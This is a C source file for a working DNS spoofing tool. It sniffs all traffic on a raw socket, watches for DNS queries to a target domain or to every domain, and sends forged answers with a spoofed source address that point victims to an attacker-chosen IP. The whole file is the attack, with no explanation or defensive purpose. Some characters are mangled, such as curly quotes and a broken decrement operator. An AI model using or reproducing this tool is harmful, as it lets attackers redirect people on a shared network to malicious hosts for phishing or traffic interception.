#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <string.h>
#include <ctype.h>
#include<netinet/if_ether.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <resolv.h>

#define IP_SIZE 16
#define REQUEST_SIZE 100
#define PCAP_INTERFACENAME_SIZE 16
#define FILTER_SIZE 200
#define DATAGRAM_SIZE 8192

char SPOOFED_IP[20];
char TARGET_HOST[20];

/* ethernet header definition */
struct etherhdr{
unsigned char ether_dhost[ETHER_ADDR_LEN]; /* dst address */
unsigned char ether_shost[ETHER_ADDR_LEN]; /* src address */
unsigned short ether_type; /* network protocol */
};

/* DNS header definition */
struct dnshdr {
char id[2];
char flags[2];
char qdcount[2];
char ancount[2];
char nscount[2];
char arcount[2];
};

/* DNS query structure */
struct dnsquery {
char *qname;
char qtype[2];
char qclass[2];
};

/* DNS answer structure */
struct dnsanswer {
char *name;
char atype[2];
char aclass[2];
char ttl[4];
char RdataLen[2];
char *Rdata;
};

/**
* Prints a terminal message with host IP and request
*/
void print_message(char* request, char* ip){
fprintf(stdout,”Host %s made a request to %s\n”, ip, request);
}

/**
* Sends a dns answer using raw sockets
*/
void send_dns_answer(char* ip, u_int16_t port, char* packet, int packlen) {
struct sockaddr_in to_addr;
int bytes_sent;
int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
int one = 1;
const int *val = &one;
if (sock < 0) {
fprintf(stderr, “Error creating socket”);
return;
}
to_addr.sin_family = AF_INET;
to_addr.sin_port = htons(port);
to_addr.sin_addr.s_addr = inet_addr(ip);
if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0){
fprintf(stderr, “Error at setsockopt()”);
return;
}
bytes_sent = sendto(sock, packet, packlen, 0, (struct sockaddr *)&to_addr, sizeof(to_addr));
if(bytes_sent < 0)
fprintf(stderr, “Error sending data”);
}

/**
* Calculates a checksum for a given header
*/

unsigned short csum(unsigned short *buf, int nwords){
unsigned long sum;
for (sum = 0; nwords > 0; nwords–)
sum += *buf++;
sum = (sum >> 16) + (sum & 0xffff);
sum += (sum >> 16);
return ~sum;
}

/**
* Builds an UDP/IP datagram
*/

void build_udp_ip_datagram(char* datagram, unsigned int payload_size, char* src_ip, char* dst_ip, u_int16_t port){
struct ip *ip_hdr = (struct ip *) datagram;
struct udphdr *udp_hdr = (struct udphdr *) (datagram + sizeof (struct ip));
ip_hdr->ip_hl = 5; //header length
ip_hdr->ip_v = 4; //version
ip_hdr->ip_tos = 0; //tos
ip_hdr->ip_len = sizeof(struct ip) + sizeof(struct udphdr) + payload_size; //length
ip_hdr->ip_id = 0; //id
ip_hdr->ip_off = 0; //fragment offset
ip_hdr->ip_ttl = 255; //ttl
ip_hdr->ip_p = 17; //protocol
ip_hdr->ip_sum = 0; //temp checksum
ip_hdr->ip_src.s_addr = inet_addr (dst_ip); //src ip – spoofed
ip_hdr->ip_dst.s_addr = inet_addr(src_ip); //dst ip
udp_hdr->source = htons(53); //src port – spoofed
udp_hdr->dest = htons(port); //dst port
udp_hdr->len = htons(sizeof(struct udphdr) + payload_size); //length
udp_hdr->check = 0; //checksum – disabled
ip_hdr->ip_sum = csum((unsigned short *) datagram, ip_hdr->ip_len >> 1); //real checksum
}

/**
* Builds a DNS answer
*/

unsigned int build_dns_answer(char *spoofed_ip, struct dnshdr *dns_hdr, char* answer, char* request){
unsigned int size = 0; /* answer size */
struct dnsquery *dns_query;
unsigned char ans[4];
sscanf(spoofed_ip, “%d.%d.%d.%d”,(int *)&ans[0],(int *)&ans[1], (int *)&ans[2], (int *)&ans[3]);
dns_query = (struct dnsquery*)(((char*) dns_hdr) + sizeof(struct dnshdr));
//dns_hdr
memcpy(&answer[0], dns_hdr->id, 2); //id
memcpy(&answer[2], “\x81\x80”, 2); //flags
memcpy(&answer[4], “\x00\x01”, 2); //qdcount
memcpy(&answer[6], “\x00\x01”, 2); //ancount
memcpy(&answer[8], “\x00\x00”, 2); //nscount
memcpy(&answer[10], “\x00\x00”, 2); //arcount
//dns_query
size = strlen(request)+2;// +1 for the size of the first string; +1 for the last ‘.’
memcpy(&answer[12], dns_query, size); //qname
size+=12;
memcpy(&answer[size], “\x00\x01”, 2); //type
size+=2;
memcpy(&answer[size], “\x00\x01”, 2); //class
size+=2;
//dns_answer
memcpy(&answer[size], “\xc0\x0c”, 2); //pointer to qname
size+=2;
memcpy(&answer[size], “\x00\x01”, 2); //type
size+=2;
memcpy(&answer[size], “\x00\x01”, 2); //class
size+=2;
memcpy(&answer[size], “\x00\x00\x00\x22”, 4); //ttl – 34s
size+=4;
memcpy(&answer[size], “\x00\x04″, 2); //rdata length
size+=2;
memcpy(&answer[size], ans, 4); //rdata
size+=4;
return size;
}

/**
* Extracts the request from a dns query
* It comes in this format: [3]www[7]example[3]com[0]
* And it is returned in this: http://www.example.com
*/

void extract_dns_request(struct dnsquery *dns_query, char *request){
unsigned int i, j, k;
char *curr = dns_query->qname;
unsigned int size;
size = curr[0];
j=0;
i=1;
while(size > 0){
for(k=0; k<size; k++){
request[j++] = curr[i+k];
}
request[j++]=’.’;
i+=size;
size = curr[i++];
}
request[–j] = ”;
}

/**
* Extracts the src port from a udp header
*/

void extract_port_from_udphdr(struct udphdr* udp, u_int16_t* port){
(*port) = ntohs((*(u_int16_t*)udp));
}

/**
* Extracts an ip from a ip header
*/

void extract_ip_from_iphdr(u_int32_t raw_ip, char* ip){
int i;
int aux[4];
for(i=0;i<4;i++){
aux[i] = (raw_ip >> (i*8)) & 0xff;
}
sprintf(ip, “%d.%d.%d.%d”,aux[0], aux[1], aux[2], aux[3]);
}

/**
* Extracts DNS query and ip from packet
*/

void extract_dns_data(const unsigned char *packet, struct dnshdr **dns_hdr, struct dnsquery *dns_query, char* src_ip, char* dst_ip, u_int16_t *port){
struct etherhdr *ether;
struct iphdr *ip;
struct udphdr *udp;
unsigned int ip_header_size;
/* ethernet header */
ether = (struct etherhdr*)(packet);
/* ip header */
ip = (struct iphdr*)(((char*) ether) + sizeof(struct etherhdr));
extract_ip_from_iphdr(ip->saddr, src_ip);
extract_ip_from_iphdr(ip->daddr, dst_ip);
/* udp header */
ip_header_size = ip->ihl*4;
udp = (struct udphdr *)(((char*) ip) + ip_header_size);
extract_port_from_udphdr(udp, port);
/* dns header */
*dns_hdr = (struct dnshdr*)(((char*) udp) + sizeof(struct udphdr));
dns_query->qname = ((char*) *dns_hdr) + sizeof(struct dnshdr);
}

/**
* Function to handle DNS packets
*/

void handle_dns_packet(const unsigned char *packet){

int all_flag=0;
struct dnsquery dns_query;
struct dnshdr *dns_hdr;
char request[REQUEST_SIZE];
char src_ip[IP_SIZE], dst_ip[IP_SIZE];
u_int16_t port;
char datagram[DATAGRAM_SIZE];
char* answer;
unsigned int datagram_size;
memset(datagram, 0, DATAGRAM_SIZE);
extract_dns_data(packet, &dns_hdr, &dns_query, src_ip, dst_ip, &port);
extract_dns_request(&dns_query, request);
if(!strcmp(TARGET_HOST,”all”)){
all_flag=1;
}else{
all_flag=0;
}
if(all_flag){
/* if it is the request that we are looking for */
/* answer is pointed to the beginning of dns header */
answer = datagram + sizeof(struct ip) + sizeof(struct udphdr);
/* modifies answer to attend our dns spoof and returns its size */
datagram_size = build_dns_answer(SPOOFED_IP, dns_hdr, answer, request);
/* modifies udp/ip to attend our dns spoof */
build_udp_ip_datagram(datagram, datagram_size, src_ip, dst_ip, port);
/* update the datagram size with ip and udp header */
datagram_size += (sizeof(struct ip) + sizeof(struct udphdr));
/* sends our dns spoof msg */
send_dns_answer(src_ip, port, datagram, datagram_size);
print_message(request, src_ip);
}else {
if(!strcmp(TARGET_HOST,request)){
/* if it is the request that we are looking for */
/* answer is pointed to the beginning of dns header */
answer = datagram + sizeof(struct ip) + sizeof(struct udphdr);
/* modifies answer to attend our dns spoof and returns its size */
datagram_size = build_dns_answer(SPOOFED_IP, dns_hdr, answer, request);
/* modifies udp/ip to attend our dns spoof */
build_udp_ip_datagram(datagram, datagram_size, src_ip, dst_ip, port);
/* update the datagram size with ip and udp header */
datagram_size += (sizeof(struct ip) + sizeof(struct udphdr));
/* sends our dns spoof msg */
send_dns_answer(src_ip, port, datagram, datagram_size);
print_message(request, src_ip);
}
}
}
void check_if_dns_packet(unsigned char *Buffer , int Size)
{
unsigned short iphdrlen;

struct iphdr *iph = (struct iphdr *)(Buffer + sizeof(struct ethhdr));
iphdrlen = iph->ihl*4;

struct udphdr *udph = (struct udphdr*)(Buffer + iphdrlen + sizeof(struct ethhdr));
if(ntohs(udph->dest)==53)
{
handle_dns_packet(Buffer);
}
}
void process_packet(unsigned char* buffer, int size)
{
//Get the IP Header part of this packet , excluding the ethernet header
struct iphdr *iph = (struct iphdr*)(buffer + sizeof(struct ethhdr));
switch (iph->protocol) //Check the Protocol and do accordingly…
{
case 17: //UDP Protocol
check_if_dns_packet(buffer , size);
break;

default: //Some Other Protocol like ARP etc.
break;
}
}
int main(int argc,char **argv)
{
if(argc<3){
fprintf(stdout,”Usage: dns_spoofer <redirectDomain> <originalRequestedDomain>\n”);
return -1;
}else{
strncpy(SPOOFED_IP,argv[1],20);
strncpy(TARGET_HOST,argv[2],20);
}
int saddr_size , data_size;
struct sockaddr saddr;
unsigned char *buffer = (unsigned char *) malloc(65536); //Its Big!

int sock_raw = socket( AF_PACKET , SOCK_RAW , htons(ETH_P_ALL)) ;
//setsockopt(sock_raw , SOL_SOCKET , SO_BINDTODEVICE , “eth0” , strlen(“eth0”)+ 1 );
if(sock_raw < 0)
{
//Print the error with proper message
perror(“Socket Error”);
return 1;
}
while(1)
{
saddr_size = sizeof saddr;
//Receive a packet
data_size = recvfrom(sock_raw , buffer , 65536 , 0 , &saddr , (socklen_t*)&saddr_size);
if(data_size <0 )
{
fprintf(stderr,”Recvfrom error , failed to get packets\n”);
return 1;
}
//Now process the packet
process_packet(buffer , data_size);
}
close(sock_raw);
return 0;
}